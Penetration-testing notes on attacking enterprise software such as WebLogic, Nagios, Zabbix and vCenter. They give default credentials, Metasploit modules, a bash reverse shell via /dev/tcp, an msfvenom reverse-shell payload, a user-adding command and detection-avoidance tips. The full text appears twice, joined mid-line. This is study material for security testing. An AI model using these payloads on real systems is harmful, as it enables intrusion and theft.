# Honorable Mentions & Specialized Software
**Concept:** Many enterprise applications follow similar vulnerability patterns to Tomcat, WordPress, or Jenkins. This section provides high-yield attack vectors for common enterprise software identified during Footprinting. 
**Methodology:** Version Fingerprinting → Default Credential Check → Built-in Functionality Abuse (App Upload/Scripting) → RCE.
## 1. Java-Based Application Servers
### Apache Axis2
Often installed on top of Tomcat instances. If Tomcat is hardened, Axis2 might be the weak link.
- **Default Credentials:** `admin:axis2`
- **Exploitation (Web Shell Upload):** Upload a malicious `.aar` (Axis2 Service Archive) file via the administration panel.
- **Exploitation (Metasploit):**
    - **Description:** Automates the upload and execution of the payload.
    - **Syntax:** `use exploit/multi/http/axis2_deployer`
    - **Options:** `set RHOSTS <Target_IP>`, `set USERNAME admin`, `set PASSWORD axis2`.
- **OPSEC Warning:** `.aar` file uploads leave persistent artifacts in the services directory. Manually cleanup via the web interface or file system after stabilizing access.
### IBM WebSphere
- **Default Credentials:** `system:manager`, `admin:admin`.
- **Exploitation (WAR Upload):**
    1. Access Administrative Console.
    2. Navigate to **Applications** -> **New Application**.
    3. Upload a malicious `.war` file (generated via `msfvenom -p java/jsp_shell_reverse_tcp ...`).
- **Privilege Note:** Java processes often run as `SYSTEM` (Windows) or `root` (Linux).
### Oracle WebLogic
Highly susceptible to **Java Deserialization** attacks via the T3 protocol.
- **Vulnerability:** CVE-2020-14882 (Unauthenticated RCE via Console path traversal).
- **Exploitation (Manual T3):**
    - **Description:** Use scripts to send serialized Java objects to the T3 listener port (usually 7001).
    - **Tool:** `weblogic_t3_pwn` or Metasploit `exploit/multi/misc/weblogic_deserialize_asyncresponseservice`.
- **OPSEC Warning:** T3 exploitation is noisy and easily detected by IDS/IPS looking for serialized Java headers.
## 2. Network & System Monitoring Tools
Monitoring tools require high privileges to query network hosts. Compromising the monitor often compromises the fleet.
### Zabbix
- **Exploitation (API Abuse):** If admin access is gained (SQLi or Auth Bypass), use the API to execute commands on agents.
- **Vector:** Create a new "Item" or "Script" using the `system.run[]` key.
- **Payload Example (Command):** `system.run[net user hacker Password123 /add]`
- **Execution:** Assign the script to a host group and trigger execution.
### Nagios
- **Default Credentials:** `nagiosadmin:nagiosadmin`, `nagiosadmin:PASSW0RD`.
- **Exploitation (Plugin RCE):** Authenticated admins can configure "Alert Commands" or "Plugins".
- **Vector:** Edit an existing command definition to append shell commands (e.g., `; /bin/bash -i >& /dev/tcp/<IP>/443 0>&1`).
- **OPSEC Warning:** Nagios runs periodic checks. Injecting into an active check will generate a callback _every_ check cycle (e.g., every 5 minutes), creating a massive pattern in network logs.
## 3. Virtualization & Infrastructure
### VMware vCenter
The heart of virtual infrastructure. A single point of failure for the entire domain.
- **Critical Vulnerabilities:**
    - `CVE-2021-21972`: Unauthorized File Upload (vCenter 6.5, 6.7, 7.0).
    - `CVE-2021-22005`: Arbitrary file upload leading to RCE.
- **Exploitation (OVA Upload):**
    - **Description:** Exploits unauthenticated OVA file upload to execute code.
    - **Module:** `exploit/multi/http/vmware_vcenter_uploadova_rce`
- **Privilege Escalation:**
    - **Windows vCenter:** Often allows easy escalation from `LocalService` to `SYSTEM` using exploits like **JuicyPotato**.
    - **Identity:** Check if the vCenter machine account is a Domain Admin (common misconfiguration).
## 4. Enterprise Content & Data Management
### Elasticsearch
- **Port:** 9200 (HTTP).
- **Exploitation (Scripting):** Older versions allow RCE via dynamic scripting (Groovy/MVEL).
- **Data Mining:** Even without RCE, unauthenticated access allows dumping all indexed data.
    - **Syntax:** `curl -X GET "http://<Target_IP>:9200/_search?pretty"`
### DotNetNuke (DNN)
- **Type:** C# / .NET CMS.
- **Exploitation:** .NET Deserialization via the `.DOTNETNUKE` cookie.
- **Vulnerability:** CVE-2017-9822 (RCE via personalized user profile data).
## 5. Document Repositories & Wikis (MediaWiki, SharePoint)
Focus on **Information Gathering** rather than just technical exploitation.
- **Tradecraft:** Use internal search functions to find operational security leaks.
- **Keywords:** `password`, `VPN`, `config`, `secret`, `SSH`, `creds`, `connection string`.
- **Access Control:** Legacy SharePoint sites often have "Everyone" or "Authenticated Users" Read permissions enabled by default on old document libraries.# Honorable Mentions & Specialized Software
**Concept:** Many enterprise applications follow similar vulnerability patterns to Tomcat, WordPress, or Jenkins. This section provides high-yield attack vectors for common enterprise software identified during Footprinting. 
**Methodology:** Version Fingerprinting → Default Credential Check → Built-in Functionality Abuse (App Upload/Scripting) → RCE.
## 1. Java-Based Application Servers
### Apache Axis2
Often installed on top of Tomcat instances. If Tomcat is hardened, Axis2 might be the weak link.
- **Default Credentials:** `admin:axis2`
- **Exploitation (Web Shell Upload):** Upload a malicious `.aar` (Axis2 Service Archive) file via the administration panel.
- **Exploitation (Metasploit):**
    - **Description:** Automates the upload and execution of the payload.
    - **Syntax:** `use exploit/multi/http/axis2_deployer`
    - **Options:** `set RHOSTS <Target_IP>`, `set USERNAME admin`, `set PASSWORD axis2`.
- **OPSEC Warning:** `.aar` file uploads leave persistent artifacts in the services directory. Manually cleanup via the web interface or file system after stabilizing access.
### IBM WebSphere
- **Default Credentials:** `system:manager`, `admin:admin`.
- **Exploitation (WAR Upload):**
    1. Access Administrative Console.
    2. Navigate to **Applications** -> **New Application**.
    3. Upload a malicious `.war` file (generated via `msfvenom -p java/jsp_shell_reverse_tcp ...`).
- **Privilege Note:** Java processes often run as `SYSTEM` (Windows) or `root` (Linux).
### Oracle WebLogic
Highly susceptible to **Java Deserialization** attacks via the T3 protocol.
- **Vulnerability:** CVE-2020-14882 (Unauthenticated RCE via Console path traversal).
- **Exploitation (Manual T3):**
    - **Description:** Use scripts to send serialized Java objects to the T3 listener port (usually 7001).
    - **Tool:** `weblogic_t3_pwn` or Metasploit `exploit/multi/misc/weblogic_deserialize_asyncresponseservice`.
- **OPSEC Warning:** T3 exploitation is noisy and easily detected by IDS/IPS looking for serialized Java headers.
## 2. Network & System Monitoring Tools
Monitoring tools require high privileges to query network hosts. Compromising the monitor often compromises the fleet.
### Zabbix
- **Exploitation (API Abuse):** If admin access is gained (SQLi or Auth Bypass), use the API to execute commands on agents.
- **Vector:** Create a new "Item" or "Script" using the `system.run[]` key.
- **Payload Example (Command):** `system.run[net user hacker Password123 /add]`
- **Execution:** Assign the script to a host group and trigger execution.
### Nagios
- **Default Credentials:** `nagiosadmin:nagiosadmin`, `nagiosadmin:PASSW0RD`.
- **Exploitation (Plugin RCE):** Authenticated admins can configure "Alert Commands" or "Plugins".
- **Vector:** Edit an existing command definition to append shell commands (e.g., `; /bin/bash -i >& /dev/tcp/<IP>/443 0>&1`).
- **OPSEC Warning:** Nagios runs periodic checks. Injecting into an active check will generate a callback _every_ check cycle (e.g., every 5 minutes), creating a massive pattern in network logs.
## 3. Virtualization & Infrastructure
### VMware vCenter
The heart of virtual infrastructure. A single point of failure for the entire domain.
- **Critical Vulnerabilities:**
    - `CVE-2021-21972`: Unauthorized File Upload (vCenter 6.5, 6.7, 7.0).
    - `CVE-2021-22005`: Arbitrary file upload leading to RCE.
- **Exploitation (OVA Upload):**
    - **Description:** Exploits unauthenticated OVA file upload to execute code.
    - **Module:** `exploit/multi/http/vmware_vcenter_uploadova_rce`
- **Privilege Escalation:**
    - **Windows vCenter:** Often allows easy escalation from `LocalService` to `SYSTEM` using exploits like **JuicyPotato**.
    - **Identity:** Check if the vCenter machine account is a Domain Admin (common misconfiguration).
## 4. Enterprise Content & Data Management
### Elasticsearch
- **Port:** 9200 (HTTP).
- **Exploitation (Scripting):** Older versions allow RCE via dynamic scripting (Groovy/MVEL).
- **Data Mining:** Even without RCE, unauthenticated access allows dumping all indexed data.
    - **Syntax:** `curl -X GET "http://<Target_IP>:9200/_search?pretty"`
### DotNetNuke (DNN)
- **Type:** C# / .NET CMS.
- **Exploitation:** .NET Deserialization via the `.DOTNETNUKE` cookie.
- **Vulnerability:** CVE-2017-9822 (RCE via personalized user profile data).
## 5. Document Repositories & Wikis (MediaWiki, SharePoint)
Focus on **Information Gathering** rather than just technical exploitation.
- **Tradecraft:** Use internal search functions to find operational security leaks.
- **Keywords:** `password`, `VPN`, `config`, `secret`, `SSH`, `creds`, `connection string`.
- **Access Control:** Legacy SharePoint sites often have "Everyone" or "Authenticated Users" Read permissions enabled by default on old document libraries.